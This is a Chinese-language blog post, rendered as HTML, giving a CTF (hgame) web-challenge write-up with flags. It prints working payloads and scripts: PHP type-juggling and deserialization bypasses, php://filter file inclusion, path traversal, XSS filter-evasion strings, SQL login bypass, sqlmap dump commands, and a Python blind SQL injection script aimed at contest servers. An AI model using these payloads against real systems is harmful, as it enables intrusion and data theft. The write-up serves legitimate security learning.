@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Are you from Europe?cnss原题,就flag改了下,对了,似乎概率也被修改了….所以不能通过改参数的方式拿flag了.. flag:hgame{Th3\_Ch0seN\_0nE!} special number123456789101112131415include_once(&quot;flag.php&quot;);    if(isset($_GET[&amp;#x27;key&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame-webwp">
+<meta property="og:url" content="http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="Are you from Europe?cnss原题,就flag改了下,对了,似乎概率也被修改了….所以不能通过改参数的方式拿flag了.. flag:hgame{Th3\_Ch0seN\_0nE!} special number123456789101112131415include_once(&quot;flag.php&quot;);    if(isset($_GET[&amp;#x27;key&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2018-02-22T10:06:43.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:12:02.241Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>hgame-webwp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/03/14/n1ctf-web%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&text=hgame-webwp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&is_video=false&description=hgame-webwp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hgame-webwp&body=Check out this article: http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&name=hgame-webwp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&t=hgame-webwp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-you-from-Europe"><span class="toc-number">1.</span> <span class="toc-text">Are you from Europe?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#special-number"><span class="toc-number">2.</span> <span class="toc-text">special number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-u-find-me"><span class="toc-number">3.</span> <span class="toc-text">can u find me?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tell-me-what-you-want"><span class="toc-number">4.</span> <span class="toc-text">tell me what you want</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E4%B8%8D%E4%B8%80%E6%A0%B7"><span class="toc-number">5.</span> <span class="toc-text">我们不一样</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Random"><span class="toc-number">6.</span> <span class="toc-text">Random?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8D%89%E8%8E%93%E7%A4%BE%E5%8C%BA-2"><span class="toc-number">7.</span> <span class="toc-text">草莓社区-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8D%89%E8%8E%93%E7%A4%BE%E5%8C%BA-1"><span class="toc-number">8.</span> <span class="toc-text">草莓社区-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-1"><span class="toc-number">9.</span> <span class="toc-text">xss-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-2"><span class="toc-number">10.</span> <span class="toc-text">xss-2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload"><span class="toc-number">10.0.1.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84sql%E9%A2%98"><span class="toc-number">11.</span> <span class="toc-text">最简单的sql题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%81%E5%88%86%E7%9A%84SQLi"><span class="toc-number">12.</span> <span class="toc-text">送分的SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84SQLi"><span class="toc-number">13.</span> <span class="toc-text">简单的SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E7%9A%84SQLi"><span class="toc-number">14.</span> <span class="toc-text">正常的SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%A6%E5%BA%97"><span class="toc-number">15.</span> <span class="toc-text">**书店</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ngc%E2%80%99s-blog"><span class="toc-number">16.</span> <span class="toc-text">ngc’s blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%88%E5%8F%8C%E5%8F%92%E5%8F%95%E6%98%AFSQLI"><span class="toc-number">17.</span> <span class="toc-text">又双叒叕是SQLI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%A3%E8%90%BD%E7%9A%84flag"><span class="toc-number">18.</span> <span class="toc-text">散落的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84SQLi"><span class="toc-number">19.</span> <span class="toc-text">奇怪的SQLi</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        hgame-webwp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-02-22T10:06:43.000Z" class="dt-published" itemprop="datePublished">2018-02-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="Are-you-from-Europe"><a href="#Are-you-from-Europe" class="headerlink" title="Are you from Europe?"></a>Are you from Europe?</h3><p>cnss原题,就flag改了下,对了,似乎概率也被修改了….所以不能通过改参数的方式拿flag了.. flag:hgame{Th3\_Ch0seN\_0nE!}</p>
+<h3 id="special-number"><a href="#special-number" class="headerlink" title="special number"></a>special number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">    if(isset($_GET[&#x27;key&#x27;]))&#123;</span><br><span class="line">        $pattern = &#x27;/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/ &#x27;;</span><br><span class="line">        $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">        if(preg_match($pattern,$key)===0)&#123;</span><br><span class="line">            echo &quot;格式错误&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $lock=&quot;******************&quot;;</span><br><span class="line">            $b = json_decode($key);</span><br><span class="line">            if($b==$lock)</span><br><span class="line">                echo $flag;</span><br><span class="line">            else</span><br><span class="line">                echo &quot;this is no special number&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>考的弱类型 0e绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:10001/?key=0e123321123</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;pHp_w34k_typing_s000_e4sy&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h3><p>明示robots.txt 查看&#x2F;f1aaaaaaaag.php 提示管理员才可以拿flag 改cookie hgame{78e01ee77a39ef4e}</p>
+<h3 id="tell-me-what-you-want"><a href="#tell-me-what-you-want" class="headerlink" title="tell me what you want"></a>tell me what you want</h3><p>get一个flag,发现要post,post之后提示要改xff然后ua啊referer啊什么的一堆东西不多写了 hgame{For9e\_hTTp\_iS\_N0T\_HArd}</p>
+<h3 id="我们不一样"><a href="#我们不一样" class="headerlink" title="我们不一样"></a>我们不一样</h3><p>strcmp,数组绕过 hgame{g3t\_f14g\_is\_so0000\_ez}</p>
+<h3 id="Random"><a href="#Random" class="headerlink" title="Random?"></a>Random?</h3><p>.swp文件泄漏vim -r random.php.swp拿源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$public</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;emmm&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$emmm</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;emmm&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_object</span>(<span class="variable">$emmm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$emmm</span>-&gt;<span class="keyword">public</span> = <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">100000000</span>);</span><br><span class="line">    <span class="variable">$emmm</span>-&gt;secret = <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">100000000</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$emmm</span>-&gt;<span class="keyword">public</span> == <span class="variable">$emmm</span>-&gt;secret) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br></pre></td></tr></table></figure>
+
+<p>稍微看一下,引用绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$public</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$temp</span>=<span class="keyword">new</span> <span class="title function_ invoke__">emmm</span>();</span><br><span class="line"><span class="variable">$temp</span>-&gt;<span class="keyword">public</span> = &amp;<span class="variable">$temp</span>-&gt;secret;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$temp</span>));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.203.108:10001/random.php?emmm=O:4:%22emmm%22:2:&#123;s:6:%22public%22;N;s:6:%22secret%22;R:2;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag: hgame{&\_Is\_wondeRful!@#}</p>
+<h3 id="草莓社区-2"><a href="#草莓社区-2" class="headerlink" title="草莓社区-2"></a>草莓社区-2</h3><p>文件包含, php伪协议php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;flag.php 拿到一个base64,解两次 hgame{!m4o\_pi4n\_ChaO\_hao\_kan!}</p>
+<h3 id="草莓社区-1"><a href="#草莓社区-1" class="headerlink" title="草莓社区-1"></a>草莓社区-1</h3><p>直接访问 <a target="_blank" rel="noopener" href="http://118.25.18.223:10011/show/_maopian.php?mao=../flag.php">http://118.25.18.223:10011/show\_maopian.php?mao=../flag.php</a> hgame{#Ma0\_pi4n\_haO\_k4n\_ma#}</p>
+<h3 id="xss-1"><a href="#xss-1" class="headerlink" title="xss-1"></a>xss-1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">charge</span>(<span class="params">input</span>) &#123;</span><br><span class="line">    input = input.<span class="title function_">replace</span>(<span class="regexp">/script/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">    input = input.<span class="title function_">replace</span>(<span class="regexp">/image/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">    input = input.<span class="title function_">replace</span>(<span class="regexp">/\(/</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;article&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/article&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后不允许交互 直接img标签.然后括号被过滤掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(-&gt;(</span><br><span class="line">)-&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;1&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="xss-2"><a href="#xss-2" class="headerlink" title="xss-2"></a>xss-2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">charge</span>(<span class="params">input</span>) &#123; </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/script/gi</span>, <span class="string">&#x27;_&#x27;</span>); </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/img/gi</span>, <span class="string">&#x27;_&#x27;</span>); </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/image/gi</span>, <span class="string">&#x27;_&#x27;</span>); </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/\(/</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/\&gt;/</span>,<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;input value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot; type=&quot;text&quot;&gt;&#x27;</span>; </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后用input标签的image属性绕</p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; type=&quot;image&quot; src=1 onerror=alert(1);&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="最简单的sql题"><a href="#最简单的sql题" class="headerlink" title="最简单的sql题"></a>最简单的sql题</h3><p>万能密码 帐号随意 密码123’or’1’&#x3D;’1 hgame{@s0ng\_fen\_ti@}</p>
+<h3 id="送分的SQLi"><a href="#送分的SQLi" class="headerlink" title="送分的SQLi"></a>送分的SQLi</h3><p>sqlmap -u <a target="_blank" rel="noopener" href="http://118.25.18.223:10068/?id=1">http://118.25.18.223:10068/?id=1</a> -D week3_sqliiii2 -T f111aa4g –dump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-------+---------------+-----------------------------------+</span><br><span class="line"> id     dajiangyoude   f111aaaggg_w3                     </span><br><span class="line">+-------+---------------+-----------------------------------+</span><br><span class="line"> 10086  kan_wo_gan_ma  hgame&#123;Th3_e4sist_sql_injeCti0n##&#125; </span><br><span class="line">+-------+---------------+-----------------------------------+</span><br></pre></td></tr></table></figure>
+
+hgame{Th3\_e4sist\_sql\_injeCti0n##}
+
+<h3 id="简单的SQLi"><a href="#简单的SQLi" class="headerlink" title="简单的SQLi"></a>简单的SQLi</h3><p>要求输入一个满足的值,使其hash的4-8位为目标值,然后再输入id,直接上脚本就好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注:md5自己写,这个import的是我嫌麻烦自己加的</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_md5</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(each)[<span class="number">4</span>:<span class="number">8</span>]==code:</span><br><span class="line">            <span class="keyword">return</span> each</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&#x27;http://118.25.18.223:10086/&#x27;</span>)</span><br><span class="line">ok=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">129</span>):</span><br><span class="line">        <span class="comment">#id_1= &quot;1&#x27; and (ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num&#125;,1))=&#123;each&#125;)%23&quot;.format(num=num,each=each)</span></span><br><span class="line">        <span class="comment">#id_1= &quot;1&#x27; and (ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\&quot;w3_fllllllll4ag\&quot;),&#123;num&#125;,1))=&#123;each&#125;)%23&quot;.format(num=num,each=each)</span></span><br><span class="line">        id_1= <span class="string">&quot;1&#x27; and (ascii(mid((select f111144g_w3_sqli1 from w3_fllllllll4ag limit 0,1),&#123;num&#125;,1))=&#123;each&#125;)%23&quot;</span>.<span class="built_in">format</span>(num=num,each=each)</span><br><span class="line">        code = re.findall(<span class="string">r&#x27;:=&quot;(.&#123;4&#125;)&quot;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        code = find_md5(code)</span><br><span class="line">        r=u.get(<span class="string">&#x27;http://118.25.18.223:10086/?id=&#x27;</span>+<span class="built_in">str</span>(id_1)+<span class="string">&quot;&amp;code=&quot;</span>+<span class="built_in">str</span>(code))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;query ok&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(each),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> each==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>表:users,w3_fllllllll4ag 列:dajiangyoude,haishijiangyou,f111144g_w3_sqli1 flag:hgame{sql\_Injection\_s000oo\_fun}</p>
+<h3 id="正常的SQLi"><a href="#正常的SQLi" class="headerlink" title="正常的SQLi"></a>正常的SQLi</h3><p>.bak文件泄漏,源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$re</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $rs[&#x27;flag&#x27;];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;因为出题人太懒了，所以现在没有任何功能&quot;</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
+
+<p>当天做的时候似乎题目是出了点问题…反正一直出错来着… 不过第二天好了… 语句只是执行,所以sleep注一下 给个脚本</p>
